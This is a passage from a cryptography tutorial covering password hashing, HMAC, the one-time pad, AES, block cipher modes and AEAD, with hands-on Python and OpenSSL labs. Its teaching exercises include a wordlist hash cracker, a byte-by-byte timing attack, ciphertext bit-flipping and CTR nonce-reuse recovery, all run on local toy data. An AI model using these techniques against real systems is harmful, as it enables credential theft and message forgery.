print(f"  stored: {h.decode()[:40]}...")

# 3. Argon2id
ph = PasswordHasher(memory_cost=65536, time_cost=3, parallelism=4)
t = time.time(); h2 = ph.hash(pw); dt = time.time()-t
print(f"\nArgon2id:   {dt*1000:.0f} ms  -> {1/dt:,.1f} hashes/sec")
print(f"  stored: {h2}")

# 4. Salts make identical passwords look different
print("\nSame password, three registrations:")
for _ in range(3): print(" ", ph.hash(b"password123")[:60], "...")
PY
```

**Break it — build the attack, then defend against it:**

```bash
python3 - <<'PY'
import hashlib, time

# A "database" hashed the naive way
db = {u: hashlib.sha256(p.encode()).hexdigest()
      for u, p in [("alice","password123"),("bob","letmein"),
                   ("carol","qwerty"),("dave","password123")]}

# Attacker observation #1: alice and dave have the SAME hash
print("identical hashes ->", [u for u,h in db.items() if h == db["alice"]])

# Attacker observation #2: a tiny wordlist cracks it instantly
wordlist = ["123456","password","letmein","qwerty","password123","admin"]
t = time.time()
rainbow = {hashlib.sha256(w.encode()).hexdigest(): w for w in wordlist}
for user, h in db.items():
    print(f"  {user:6} -> {rainbow.get(h, '(not in wordlist)')}")
print(f"cracked in {(time.time()-t)*1000:.2f} ms")
PY
```

Now re-run it with Argon2id and per-user salts, and observe that the same attack
gains nothing.

### Common confusions

- **"We hash with SHA-512, that's stronger than SHA-256."** Both are far too
  fast. Strength of the hash is not the problem; *speed* is.
- **"We encrypt passwords."** Then you can decrypt them, and so can whoever steals
  the key. Passwords should be *hashed*, never encrypted. (Exception: a password
  *manager* must be able to give the password back — that's a different problem.)
- **"Our salt is `username + 'salt'`."** A salt must be **random** and
  **unpredictable**. A deterministic salt still allows targeted precomputation.
- **"We require 8 characters with a symbol and a number."** Current NIST guidance
  (SP 800-63B) says: allow long passphrases, screen against breached lists, and
  **stop** forcing composition rules and periodic rotation. They push users toward
  `Password1!` and reduce real entropy.

### Check yourself

1. Why is SHA-256 a bad choice for passwords?
2. What is a salt, is it secret, and what attack does it prevent?
3. What does "memory-hard" mean and why does it matter?
4. Name the recommended password hash for new systems, with rough parameters.
5. What is username enumeration and how do you prevent it?

### Further reading

- **Cheat sheet (read before shipping):** OWASP *Password Storage Cheat Sheet* —
  the authoritative, regularly-updated parameter recommendations.
- **Standard:** NIST SP 800-63B, *Digital Identity Guidelines: Authentication* —
  the source of modern "don't force rotation" guidance. Section 5.1.1 is the one
  to read.
- **Service:** Have I Been Pwned's Pwned Passwords API — free, uses k-anonymity so
  you never send the full hash. Integrate it; it's a large win for little effort.
- **Article:** "How to Safely Store a Password" — Coda Hale. Old but the
  reasoning is timeless.

---

## Chapter 11 — HMAC: proving a message wasn't tampered with

### In one sentence

An HMAC is a hash that requires a secret key, so it proves both that the message
is unchanged **and** that it came from someone holding the key.

### The problem a plain hash doesn't solve

```
   Alice sends:   message = "pay bob 100"
                  hash    = sha256(message)

   Mallory intercepts, and simply sends:
                  message = "pay mallory 9000"
                  hash    = sha256("pay mallory 9000")     <-- she can compute it!

   Bob checks the hash. It matches. He pays.
```

A hash proves **integrity against accidents**, not against attackers — because
anyone can recompute it. You need a **secret**.

### The naive fix, and why it fails

```
   BROKEN:   tag = sha256(secret || message)

   Vulnerable to LENGTH EXTENSION (Chapter 9): given the tag and the length
   of the secret, an attacker computes a valid tag for
   message || padding || anything_they_want -- without knowing the secret.
```

This is not theoretical: it's how the **Flickr API signature** was broken in
2009.

### HMAC: the correct construction

HMAC nests the hash twice with two derived keys, which defeats length extension:

```
   HMAC(K, m) = H( (K XOR opad) || H( (K XOR ipad) || m ) )

   where  ipad = 0x36 repeated,  opad = 0x5c repeated
```

You never need to implement this — every language has it. But knowing *why* it's
nested explains why you must not roll your own.

```
   Alice:  tag = HMAC-SHA256(shared_key, "pay bob 100")
           sends (message, tag)

   Bob:    recomputes HMAC-SHA256(shared_key, received_message)
           compares to received tag, IN CONSTANT TIME

   Mallory: cannot produce a valid tag without the key.
```

### MAC vs Signature — the distinction that matters

```
   HMAC (symmetric)                 SIGNATURE (asymmetric, Chapter 21)
   ----------------                 ---------------------------------
   ONE shared key                   private key signs, public key verifies
   Both parties can create tags     only the holder of the private key can sign
   FAST (microseconds)              slower (milliseconds)
   -> integrity + authenticity      -> integrity + authenticity + NON-REPUDIATION

   Because both sides can create an HMAC, Bob cannot prove to a THIRD PARTY
   that Alice sent it -- he could have made it himself.
   A signature can be proven to a third party. That's non-repudiation.
```

Choose HMAC when both parties are you (session tokens, internal APIs, webhooks).
Choose signatures when a third party must verify, or when you can't share a key.

### Where you'll actually use HMAC

| Use | Detail |
|---|---|
| **Session tokens / signed cookies** | `value | HMAC(key, value)` — tamper-evident without server state |
| **Webhook verification** | Stripe, GitHub, etc. sign payloads; you verify before trusting |
| **API request signing** | AWS SigV4 signs method + path + body + timestamp |
| **JWT with HS256** | The signature is an HMAC |
| **Key derivation** | HKDF is built from HMAC |
| **TLS** | Record integrity (in non-AEAD modes) and key derivation |

### Constant-time comparison — do not skip this

```python
   # DANGEROUS -- leaks information through timing
   if computed_tag == received_tag:      # == returns early on first mismatch

   # CORRECT
   import hmac
   if hmac.compare_digest(computed_tag, received_tag):
```

A normal `==` stops at the first differing byte. An attacker who can measure
response times learns *how many leading bytes were correct*, and can then forge
a tag one byte at a time — a few thousand requests instead of 2^256 guesses.

**Use constant-time comparison for every secret comparison**: MACs, tokens, API
keys, password reset codes, TOTP codes.

### Practice (30 min)

```bash
cd ~/sec-lab/scratch

python3 - <<'PY'
import hmac, hashlib, time

key = b"shared-secret-key"

def sign(msg: bytes) -> str:
    return hmac.new(key, msg, hashlib.sha256).hexdigest()

def verify(msg: bytes, tag: str) -> bool:
    return hmac.compare_digest(sign(msg), tag)     # CONSTANT TIME

msg = b"pay bob 100"
tag = sign(msg)
print("message:", msg.decode())
print("tag:    ", tag)
print("verify original: ", verify(msg, tag))

# Attacker tampers with the message
print("verify tampered: ", verify(b"pay mallory 9000", tag))

# Attacker tries to forge a tag without the key -- they can't
print("forged tag ok?:  ", verify(b"pay mallory 9000",
       hmac.new(b"guessed-key", b"pay mallory 9000", hashlib.sha256).hexdigest()))
PY
```

**Now demonstrate the timing leak yourself** — this is the exercise that makes
constant-time comparison stick:

```bash
python3 - <<'PY'
import time, statistics

SECRET = "a1b2c3d4e5f6a7b8"

def unsafe_compare(a, b):          # early-return, like ==
    if len(a) != len(b): return False
    for x, y in zip(a, b):
        if x != y: return False
        time.sleep(0.0005)         # exaggerate real per-byte work
    return True

def timed(guess, n=15):
    ts = []
    for _ in range(n):
        t = time.perf_counter(); unsafe_compare(SECRET, guess)
        ts.append(time.perf_counter() - t)
    return statistics.median(ts)

# Recover the secret one character at a time by timing alone
recovered = ""
for pos in range(len(SECRET)):
    best = max("0123456789abcdef",
               key=lambda c: timed(recovered + c + "x"*(len(SECRET)-pos-1)))
    recovered += best
    print(f"  position {pos:2}: {recovered}")
print("\nrecovered:", recovered, "| correct:", recovered == SECRET)
PY
```

You just extracted a secret without ever guessing it. **That is why
`hmac.compare_digest` exists.**

### Common confusions

- **"HMAC encrypts the message."** It doesn't. The message travels in the clear;
  HMAC only proves it wasn't altered. For secrecy *and* integrity, use AEAD
  (Chapter 15).
- **"I'll just hash the secret and message together."** Length extension. Use
  HMAC.
- **"Any hash works in HMAC."** HMAC-MD5 is not immediately broken (HMAC's
  construction is resilient), but there's no reason to use it. Use HMAC-SHA256.
- **"Timing attacks need physical access."** They've been demonstrated
  successfully over networks. Don't rely on jitter to protect you.

### Check yourself

1. Why doesn't a plain hash protect against a deliberate attacker?
2. What does HMAC add, and what does it require both parties to have?
3. What's the difference between a MAC and a signature? What does a signature add?
4. Why must tag comparison be constant-time?
5. When would you use HMAC over a signature?

### Further reading

- **RFC 2104** — the HMAC specification. Short and readable; a good first RFC.
- **Docs:** Stripe's and GitHub's webhook-signature verification docs — real,
  well-designed examples you can copy the pattern from.
- **Article:** "A Lesson In Timing Attacks" — Nate Lawson. The classic
  explanation of why `==` is dangerous.

---

### End of Part 3 — Milestone check

- [ ] I can name the four properties of a cryptographic hash
- [ ] I know MD5 and SHA-1 are broken, and specifically *how*
- [ ] **I have seen two different files with the same MD5**
- [ ] I can explain why SHA-256 is wrong for passwords
- [ ] I know what a salt is and that it isn't secret
- [ ] I can write correct password storage with Argon2id
- [ ] **I have demonstrated a timing attack and understand `compare_digest`**

---

# Part 4 — Symmetric encryption

Symmetric means **one key, used for both encryption and decryption**. It is fast,
well understood, and does almost all of the actual encrypting in the world.

## Chapter 12 — The idea, and what "perfect secrecy" costs

### In one sentence

Encryption transforms a message using a key so that only someone with the key can
recover it — and the *only* provably unbreakable scheme is also completely
impractical.

### The vocabulary

```
   PLAINTEXT     the original message                    "attack at dawn"
   KEY           the shared secret                        (128-256 random bits)
   CIPHERTEXT    the scrambled output                     8f3a2b91c4...
   CIPHER        the algorithm                            AES, ChaCha20

        plaintext + key  --[ encrypt ]-->  ciphertext
        ciphertext + key --[ decrypt ]-->  plaintext
```

**Symmetric** = the same key both ways. **Asymmetric** (Part 5) = two different
keys.

### Kerckhoffs's principle

> **The system must remain secure even if everything about it, except the key, is
> public knowledge.**

Stated in 1883, and it is the single most important rule in this Part. All the
secrecy lives in the **key**, never in the algorithm.

Why this matters practically:

```
   "Our encryption is proprietary, nobody knows how it works."
        -> This is a RED FLAG, not a feature.

   Real algorithms (AES, ChaCha20) are published, standardised, and have been
   attacked by thousands of researchers for decades without breaking.
   THAT is why we trust them.

   Your in-house cipher has been reviewed by you.
```

**Never roll your own crypto.** Not the algorithm, and preferably not the
implementation either. This is not gatekeeping — it is that cryptographic bugs
are silent. The code runs, the output looks random, and it is broken.

### The one-time pad: perfect, and useless

There *is* an unbreakable cipher. XOR (§0.5) the message with a truly random key
**the same length as the message**, and never reuse the key.

```
   plaintext   01100001 01110100 01110100     "att"
   key(random) 11010110 00101110 10011001
               --------------------------- XOR
   ciphertext  10110111 01011010 11101101
```

Claude Shannon proved in 1949 that this has **perfect secrecy**: the ciphertext
gives an attacker literally zero information. Any plaintext of the same length is
equally possible.

**So why doesn't everyone use it?**

```
   1. The key must be as LONG as the message.
      Encrypting 1 GB needs 1 GB of key -- which you must somehow
      already have shared securely. If you can do that, you could
      have just shared the message.

   2. The key must be TRULY RANDOM. Not a PRNG. Real entropy.

   3. The key must NEVER be reused. Not once.

   4. It provides NO INTEGRITY. An attacker who knows the plaintext
      can flip any bit they like:
         ciphertext XOR ("attack" XOR "defend") = a valid encryption of "defend"
```

### Why key reuse is catastrophic

This is worth seeing, because the same mistake recurs in modern systems (nonce
reuse — Chapter 14).

```
   C1 = P1 XOR K
   C2 = P2 XOR K

   Attacker computes:
   C1 XOR C2 = (P1 XOR K) XOR (P2 XOR K) = P1 XOR P2
                                            ^^^^^^^^^
                        the key CANCELS OUT completely.
```

The attacker now has the XOR of two plaintexts, which is readily separated using
language statistics. This broke the Soviet **VENONA** traffic in the 1940s, and it
broke Microsoft's **PPTP** and WEP decades later.

> **The lesson that carries forward:** a stream of key material must never be
> reused with different data. Modern ciphers keep this property; you break it by
> reusing a nonce.

### What real ciphers do instead

Take a **short** key (128–256 bits) and stretch it into a long, unpredictable
keystream — or scramble data in fixed-size blocks. You give up *provable* perfect
secrecy for *computational* security: breaking it is possible in principle and
infeasible in practice.

```
   ONE-TIME PAD      perfect secrecy      impractical
   AES / ChaCha20    computational        a 256-bit key protects terabytes
                     security             and fits in a config file
```

### Practice (15 min)

```bash
mkdir -p ~/sec-lab/scratch && cd ~/sec-lab/scratch

python3 - <<'PY'
import os

def xor(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

# 1. One-time pad works
msg = b"attack at dawn"
key = os.urandom(len(msg))
ct  = xor(msg, key)
print("plaintext :", msg)
print("ciphertext:", ct.hex())
print("decrypted :", xor(ct, key))

# 2. Reusing the key destroys it
p1, p2 = b"attack at dawn", b"retreat at dusk"
k = os.urandom(20)
c1, c2 = xor(p1, k), xor(p2, k)
print("\nC1 XOR C2 =", xor(c1, c2).hex())
print("P1 XOR P2 =", xor(p1, p2).hex())
print("identical -- the key cancelled out:", xor(c1, c2)[:14] == xor(p1, p2)[:14])

# 3. No integrity: flip 'attack' to 'defend' without the key
known, target = b"attack", b"defend"
forged = xor(ct[:6], xor(known, target)) + ct[6:]
print("\nforged decrypts to:", xor(forged, key))
PY
```

That third demo is the important one: **the attacker changed the message without
the key.** Encryption alone does not give you integrity. Chapter 15 fixes this.

### Common confusions

- **"Longer key = proportionally more secure."** 128-bit is already beyond brute
  force. 256-bit is margin (and post-quantum hedging, Chapter 23), not 2× the
  security.
- **"Encryption means the data can't be changed."** No. Encryption gives
  confidentiality only. Integrity needs a MAC or AEAD.
- **"XOR is weak."** XOR with a *proper keystream* is exactly what stream ciphers
  do. XOR with a short repeating key is the weak part.

### Check yourself

1. State Kerckhoffs's principle and why "proprietary encryption" is a warning
   sign.
2. What makes the one-time pad impractical? Give three reasons.
3. What happens if you XOR two ciphertexts encrypted with the same key?
4. Does encryption protect against tampering?

*(Answers: Appendix F.)*

### Further reading

- **Book:** *Serious Cryptography* (2nd ed.), Aumasson — Chapters 1–4. The best
  accessible treatment of everything in this Part.
- **Video:** Computerphile, "One Time Pad" and "XOR & the One Time Pad".
- **Article:** "Cryptographic Right Answers" (Latacora) — a short, opinionated
  list of what to use. Read it now and again after Part 5.

---

## Chapter 13 — Block ciphers and AES

### In one sentence

AES scrambles data in fixed 128-bit blocks using a key, and it is the symmetric
cipher you should use unless you have a specific reason not to.

### Block vs stream ciphers

```
   BLOCK CIPHER                          STREAM CIPHER
   encrypts fixed-size chunks            generates a keystream, XORs it
   AES: always 128-bit (16-byte) blocks   ChaCha20, and AES in CTR mode

   needs PADDING if data isn't a          works on any length, byte by byte
   multiple of the block size
```

In practice the line is blurry: AES in counter mode (Chapter 14) *is* a stream
cipher built from a block cipher.

### AES, briefly

**AES** (Advanced Encryption Standard) was selected by NIST in 2001 after a
five-year open competition. The winning design was called Rijndael.

```
   Block size:  128 bits (16 bytes)  -- ALWAYS, for every key size
   Key sizes:   128, 192, or 256 bits
   Rounds:      10 (AES-128), 12 (AES-192), 14 (AES-256)
```

Each round performs four steps on a 4×4 byte grid:

```
   SubBytes     substitute each byte via a lookup table (non-linearity)
   ShiftRows    shift row i left by i positions        (diffusion across columns)
   MixColumns   mix the bytes within each column        (diffusion within columns)
   AddRoundKey  XOR with a key derived for this round   (the secret)
```

**You never need to implement this.** What matters is the *properties*: after 10+
rounds, every output bit depends on every input bit and every key bit, and no
known attack does meaningfully better than brute force.

> **Optional detail:** the best known attacks on full AES-256 reduce the work
> from 2^256 to about 2^254 — an academic result with no practical impact.
> Related-key attacks exist against AES-192/256 but require key relationships
> that don't occur in correct use.

### AES-128 vs AES-256

| | AES-128 | AES-256 |
|---|---|---|
| Brute force | 2^128 — infeasible forever | 2^256 — infeasible forever |
| Speed | ~40% faster | slower (14 rounds vs 10) |
| Post-quantum (Grover) | ~2^64 effective — **uncomfortable** | ~2^128 effective — **fine** |
| Recommendation | Fine today | **Use this** for anything long-lived |

Chapter 23 explains the Grover column. Short version: **use AES-256** — the cost
is small and it is the simple hedge against quantum attacks on symmetric crypto.

### Hardware acceleration matters enormously

Modern CPUs implement AES in hardware (Intel/AMD **AES-NI**, ARMv8 crypto
extensions).

```
   AES in software:  ~100-200 MB/s per core
   AES with AES-NI:  ~1-5 GB/s per core       -- 10-50x faster
```

This is why AES-GCM dominates TLS on servers. On hardware *without* acceleration
(older ARM, some embedded, some phones), **ChaCha20-Poly1305 is faster** — which
is exactly why TLS supports both and mobile clients often prefer ChaCha20.

### Padding

A block cipher needs whole blocks. **PKCS#7 padding** appends N bytes, each with
value N:

```
   13 bytes of data + 3 bytes padding:   ... 03 03 03
   16 bytes of data (already a full block) adds a WHOLE extra block of 16 x 0x10
       (so the receiver can always unambiguously remove padding)
```

Padding seems boring. It caused the **padding oracle attack** — one of the most
important practical crypto attacks ever found (Chapter 14). Modes like CTR and
GCM avoid padding entirely, which is one reason they won.

### Practice (20 min)

```bash
cd ~/sec-lab/scratch

# --- Does your CPU accelerate AES? ---
openssl speed -evp aes-256-gcm 2>/dev/null | tail -4
openssl speed -evp chacha20-poly1305 2>/dev/null | tail -4
# On x86 check the flag directly:
grep -o aes /proc/cpuinfo 2>/dev/null | head -1 || sysctl -a 2>/dev/null | grep -i aes | head -2

# --- Block size is always 16 bytes ---
printf 'a' > one.txt
openssl enc -aes-256-ecb -K $(openssl rand -hex 32) -in one.txt -out one.enc
ls -l one.txt one.enc      # 1 byte in, 16 bytes out -- padding
```

**Break it:** encrypt a 16-byte file and check the output size. Why is it 32 bytes
and not 16? (Answer: padding must always be added so it can be unambiguously
removed.)

### Common confusions

- **"AES-256 is twice as strong as AES-128."** It's 2^128 times more work to brute
  force, but both are already infeasible. The real reason to prefer 256 is
  quantum hedging.
- **"AES is broken because I read about an attack."** Attacks on *reduced-round*
  AES and on *bad implementations* exist. Full AES with correct use is unbroken.
- **"I should use the biggest key size for everything."** Use AES-256, but know
  the real risks are mode misuse, key management, and side channels — not key
  size.

### Check yourself

1. What is AES's block size, and does it change with key size?
2. Name the four operations in an AES round (roughly).
3. Why might ChaCha20 be preferable to AES on a phone?
4. Why does encrypting 16 bytes produce 32 bytes of output?

### Further reading

- **Standard:** FIPS 197 — the AES specification. Surprisingly readable, with
  worked examples in the appendices.
- **Interactive:** "A Stick Figure Guide to AES" (moserware.com) — genuinely
  charming and accurate.
- **Video:** Computerphile, "AES Explained".

---

## Chapter 14 — Modes of operation (and why ECB is a meme)

### In one sentence

A block cipher only encrypts 16 bytes; a **mode** defines how to chain blocks
together to encrypt a real message — and choosing the wrong mode breaks
everything.

### The problem

AES encrypts exactly one 16-byte block. Your message is 4,000 bytes. Now what?

### ECB — Electronic Codebook (never use this)

The obvious approach: encrypt each block independently.

```
   P1 -> [AES] -> C1
   P2 -> [AES] -> C2
   P3 -> [AES] -> C3
```

**The fatal flaw: identical plaintext blocks produce identical ciphertext
blocks.** Structure in the plaintext survives into the ciphertext.

```
   THE FAMOUS DEMONSTRATION

   Take a bitmap image of the Linux penguin. Encrypt it with AES-ECB.
   The result is still visibly a penguin -- because large areas of identical
   colour become large areas of identical ciphertext.

           original                 AES-256-ECB
        +-------------+           +-------------+
        |   (o_o)     |           | ::::(o_o):: |     <-- you can still SEE it
        |  <penguin>  |    ==>    | :<penguin>: |
        |             |           | ::::::::::: |
        +-------------+           +-------------+
```

This isn't a toy concern. ECB leaks:
- Repeated records in an encrypted database
- Whether two encrypted messages are the same
- Structure in encrypted network protocols

> **Dangerous:** ECB is often the *default* in older libraries and in naive code
> (`Cipher.getInstance("AES")` in Java historically defaulted to ECB). If you see
> ECB in a code review, it is a finding.

### CBC — Cipher Block Chaining

XOR each plaintext block with the *previous ciphertext block* before encrypting.
A random **IV** (initialisation vector) seeds the chain.

```
        IV        P1              P2              P3
         |         |               |               |
         +--XOR----+     +--XOR----+     +--XOR----+
                   |     |         |     |         |
                 [AES] --+       [AES] --+       [AES]
                   |               |               |
                   C1              C2              C3
```

Now identical plaintext blocks encrypt differently. Properties:

```
   + hides patterns
   - SEQUENTIAL encryption (can't parallelise)      decryption CAN parallelise
   - needs padding                                   -> padding oracle risk
   - NO integrity protection
   - IV must be random and unpredictable (not just unique)
```

**The padding oracle attack.** If an attacker can tell the difference between
"padding was invalid" and "padding was valid but the message was wrong" — through
error messages, response codes, or *timing* — they can decrypt the entire
ciphertext without the key, one byte at a time. This broke ASP.NET (2010),
Ruby on Rails, JSF, and many others.

**The fix is not "hide the error".** The fix is to authenticate the ciphertext
(Chapter 15) so invalid data is rejected before decryption is even attempted.

### CTR — Counter mode

Turn the block cipher into a stream cipher: encrypt a *counter*, then XOR the
result with the plaintext.

```
   nonce||counter=1 -> [AES] -> keystream1 -> XOR P1 -> C1
   nonce||counter=2 -> [AES] -> keystream2 -> XOR P2 -> C2
   nonce||counter=3 -> [AES] -> keystream3 -> XOR P3 -> C3
```

```
   + fully PARALLELISABLE both ways
   + NO padding needed (works on any length)
   + random access -- decrypt block 500 without blocks 1-499
   - NO integrity protection
   - CATASTROPHIC if a nonce+key pair is ever reused
```

**Nonce reuse in CTR is exactly the one-time-pad key reuse from Chapter 12.**
Same keystream, XOR the ciphertexts, key cancels out. This is the single most
dangerous footgun in symmetric cryptography.

### The mode comparison

| Mode | Parallel | Padding | Integrity | Nonce reuse | Verdict |
|---|---|---|---|---|---|
| **ECB** | yes | yes | no | n/a | **Never** |
| **CBC** | decrypt only | yes | no | reveals if plaintexts match | Legacy only, with a MAC |
| **CTR** | yes | no | no | **catastrophic** | Only inside AEAD |
| **GCM** | yes | no | **yes** | **catastrophic** | **Default (Ch 15)** |
| **ChaCha20-Poly1305** | yes | no | **yes** | **catastrophic** | **Default (Ch 15)** |
| **XTS** | yes | no | no | n/a | Disk encryption only |

### Practice (30 min) — see ECB fail with your own eyes

This is the most memorable exercise in Part 4. Do it.

```bash
cd ~/sec-lab/scratch

python3 - <<'PY'
# Build a simple image with large blocks of identical colour (a PPM file --
# a trivial uncompressed format, so no compression hides the effect).
W, H = 256, 256
px = bytearray()
for y in range(H):
    for x in range(W):
        # a white circle on a black background
        inside = (x-128)**2 + (y-128)**2 < 90**2
        px += bytes([255,255,255] if inside else [0,0,0])
open("plain.ppm","wb").write(b"P6\n%d %d\n255\n" % (W,H) + bytes(px))
print("wrote plain.ppm", W, "x", H)
PY

# Encrypt the PIXEL DATA with ECB, keeping the header readable
KEY=$(openssl rand -hex 32)
head -c 15 plain.ppm > header.bin                      # "P6\n256 256\n255\n"
tail -c +16 plain.ppm > body.bin
openssl enc -aes-256-ecb -K $KEY -in body.bin -out body.ecb -nopad
cat header.bin body.ecb > ecb.ppm

# And with CBC for comparison
IV=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -K $KEY -iv $IV -in body.bin -out body.cbc -nopad
cat header.bin body.cbc > cbc.ppm

echo "Now open plain.ppm, ecb.ppm and cbc.ppm in an image viewer."
echo "ECB: you can still see the circle.  CBC: pure noise."
```

On macOS: `open -a Preview *.ppm`. On Linux: `xdg-open ecb.ppm` or use GIMP.
If your viewer can't read PPM: `python3 -c "from PIL import Image; [Image.open(f).save(f.replace('.ppm','.png')) for f in ['plain.ppm','ecb.ppm','cbc.ppm']]"` (needs `pip install pillow`).

**Now demonstrate CTR nonce reuse:**

```bash
python3 - <<'PY'
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

key   = os.urandom(32)
nonce = os.urandom(16)          # the SAME nonce, reused -- the bug

def ctr(data):
    c = Cipher(algorithms.AES(key), modes.CTR(nonce)).encryptor()
    return c.update(data) + c.finalize()

p1 = b"TRANSFER 100 USD TO ALICE"
p2 = b"TRANSFER 999 USD TO EVE!!"
c1, c2 = ctr(p1), ctr(p2)

x = bytes(a ^ b for a, b in zip(c1, c2))
y = bytes(a ^ b for a, b in zip(p1, p2))
print("C1 XOR C2 == P1 XOR P2 :", x == y)
# Knowing ONE plaintext reveals the other:
print("recovered p2:", bytes(a ^ b for a, b in zip(x, p1)))
PY
```

*(Requires `pip install cryptography` inside a virtualenv.)*

### Common confusions

- **"CBC is broken."** CBC itself is fine; **unauthenticated** CBC is the problem.
  TLS 1.2 with CBC needed careful Encrypt-then-MAC. Just use AEAD.
- **"A nonce is the same as an IV."** Similar role, different requirements. A CBC
  IV must be **unpredictable**; a CTR/GCM nonce must be **unique** (predictable is
  fine). Both must never repeat with the same key.
- **"I'll just use a counter as my nonce."** That's correct *if* you can guarantee
  it never resets — which fails on VM snapshots, restores, and multi-writer
  systems. Random 96-bit nonces are safer for most applications.

### Check yourself

1. Why does ECB leak the structure of an image?
2. What does the IV do in CBC, and what property must it have?
3. What happens if you reuse a nonce in CTR mode?
4. Which modes require padding, and why is that a risk?
5. Which of these modes provide integrity? (Trick question.)

### Further reading

- **Wikipedia:** "Block cipher mode of operation" — unusually good, with the
  canonical ECB penguin image.
- **Article:** "Padding Oracles and the Decline of CBC-mode Cipher Suites"
  (Cloudflare blog) — clear explanation of a real, important attack.
- **Standard:** NIST SP 800-38A (modes) and SP 800-38D (GCM).

---

## Chapter 15 — AEAD: encryption and authentication together

### In one sentence

**AEAD** gives you confidentiality *and* integrity in one operation, and it is
what you should use for essentially all new encryption.

### The problem it solves

Every mode in Chapter 14 lacked integrity. That means an attacker can modify
ciphertext, and the receiver decrypts garbage — or worse, *meaningful* garbage
(the bit-flipping attack from Chapter 12).

You could bolt on an HMAC (Chapter 11), but people got the details wrong for
twenty years:

```
   Encrypt-and-MAC  (SSH)      MAC the PLAINTEXT, send both.
                               -> the MAC can leak plaintext info

   MAC-then-Encrypt (old TLS)  MAC the plaintext, then encrypt both.
                               -> must decrypt before verifying
                               -> padding oracle attacks

   Encrypt-then-MAC (correct)  Encrypt, then MAC the CIPHERTEXT.
                               -> verify FIRST, reject invalid data
                                  without ever decrypting it
```

**Encrypt-then-MAC is the correct order.** AEAD modes implement it for you, in a
single reviewed primitive, so you cannot get it wrong.

### How AEAD works

```
                 +-------------------------------------------+
   plaintext --> |                                            |
   key       --> |            AEAD ENCRYPT                    | --> ciphertext
   nonce     --> |                                            | --> TAG (16 bytes)
   AAD       --> |                                            |
                 +-------------------------------------------+

   AAD = "Additional Authenticated Data"
         Data that is AUTHENTICATED but NOT ENCRYPTED.
         e.g. a message header, a record number, a version field.
         Anyone can read it; nobody can change it undetected.
```

On decryption, the tag is verified **first**. If it fails, you get an error and
**no plaintext at all**. That single property eliminates whole attack classes.

### The two you should use

| | **AES-GCM** | **ChaCha20-Poly1305** |
|---|---|---|
| Key | 128 or **256** bits | 256 bits |
| Nonce | **96 bits (12 bytes)** | 96 bits |
| Tag | 128 bits (16 bytes) | 128 bits |
| Speed with AES-NI | **Very fast** (GB/s) | fast |
| Speed without AES-NI | slow | **Very fast** |
| Timing-safe in software | hard | **yes, by design** |
| Nonce reuse | **catastrophic** — also leaks the auth key | catastrophic |
| Max data per key/nonce | ~64 GB per nonce | effectively unlimited |

**Pick either.** Use AES-256-GCM on servers, ChaCha20-Poly1305 on mobile/embedded
without AES hardware. TLS negotiates this automatically.

**Also worth knowing: XChaCha20-Poly1305** uses a **192-bit** nonce, which is
large enough that random nonces will never collide in practice. If you're
encrypting many messages and are nervous about nonce management, this is the
safest choice. (Available in libsodium; not in TLS.)

### The nonce rule

```
   +---------------------------------------------------------------+
   |  NEVER use the same (key, nonce) pair twice.                    |
   |                                                                 |
   |  With GCM this is worse than with CTR: it not only reveals      |
   |  the XOR of plaintexts, it lets an attacker recover the         |
   |  authentication key and FORGE arbitrary messages.               |
   |                                                                 |
   |  Safe approaches:                                               |
   |    * random 96-bit nonce, and rotate the key every ~2^32        |
   |      messages (birthday bound)                                   |
   |    * a strict counter, if you can guarantee it never resets      |
   |    * XChaCha20-Poly1305 with random 192-bit nonces               |
   +---------------------------------------------------------------+
```

The nonce is **not secret** — send it alongside the ciphertext. It just must be
unique.

### The standard message format

```
   [ nonce (12 bytes) ][ ciphertext (n bytes) ][ tag (16 bytes) ]

   Overhead: 28 bytes per message, regardless of size.
```

Most libraries append the tag to the ciphertext automatically. You store/transmit
the nonce with it.

### Practice (35 min)

```bash
cd ~/sec-lab/scratch
python3 -m venv .venv && .venv/bin/pip install -q cryptography

.venv/bin/python - <<'PY'
import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305

key   = AESGCM.generate_key(bit_length=256)
aead  = AESGCM(key)
nonce = os.urandom(12)
aad   = b"msg-version:1;user:alice"      # authenticated, NOT encrypted

pt = b"attack at dawn"
ct = aead.encrypt(nonce, pt, aad)

print("plaintext :", pt, f"({len(pt)} bytes)")
print("ciphertext:", ct.hex(), f"({len(ct)} bytes = {len(pt)} + 16 tag)")
print("decrypted :", aead.decrypt(nonce, ct, aad))

# 1. Tamper with ONE BIT of ciphertext
bad = bytearray(ct); bad[0] ^= 0x01
try:
    aead.decrypt(nonce, bytes(bad), aad)
except Exception as e:
    print("\ntampered ciphertext ->", type(e).__name__, "(no plaintext returned)")

# 2. Tamper with the AAD (which travels in the clear)
try:
    aead.decrypt(nonce, ct, b"msg-version:1;user:mallory")
except Exception as e:
    print("tampered AAD        ->", type(e).__name__)

# 3. Wrong nonce
try:
    aead.decrypt(os.urandom(12), ct, aad)
except Exception as e:
    print("wrong nonce         ->", type(e).__name__)

# 4. ChaCha20-Poly1305 -- identical interface
c = ChaCha20Poly1305(ChaCha20Poly1305.generate_key())
n = os.urandom(12)
print("\nchacha20 round trip:", c.decrypt(n, c.encrypt(n, b"hello", None), None))
PY
```

Expected output confirms: **14-byte plaintext → 30-byte output** (the 16-byte
tag), and every tampering attempt raises `InvalidTag` with **no plaintext
returned**.

**Break it — the AAD lesson:** encrypt a message with AAD `{"role":"user"}` and
try to change it to `{"role":"admin"}` on the wire. It fails. Now do the same
with plain CTR mode and watch it succeed. That contrast is the whole value of
AEAD.

### Encrypting files with OpenSSL

```bash
cd ~/sec-lab/scratch
echo "top secret plans" > secret.txt

# Password-based (OpenSSL derives the key with PBKDF2)
openssl enc -aes-256-cbc -pbkdf2 -iter 600000 -salt \
        -in secret.txt -out secret.enc -pass pass:'correct horse battery staple'

openssl enc -d -aes-256-cbc -pbkdf2 -iter 600000 \
        -in secret.enc -pass pass:'correct horse battery staple'
```

> **Note:** `openssl enc` does **not** support AEAD modes properly (there's no
> way to handle the tag). For real work use **age**, **libsodium**, or your
> language's AEAD API. `openssl enc` is fine for a quick file with a password,
> and the `-pbkdf2 -iter` flags are **mandatory** — without them OpenSSL uses a
> single MD5 iteration, which is trivially crackable.

**`age` is the modern replacement** and is much harder to misuse:

```bash
# brew install age   /   apt install age
age-keygen -o key.txt
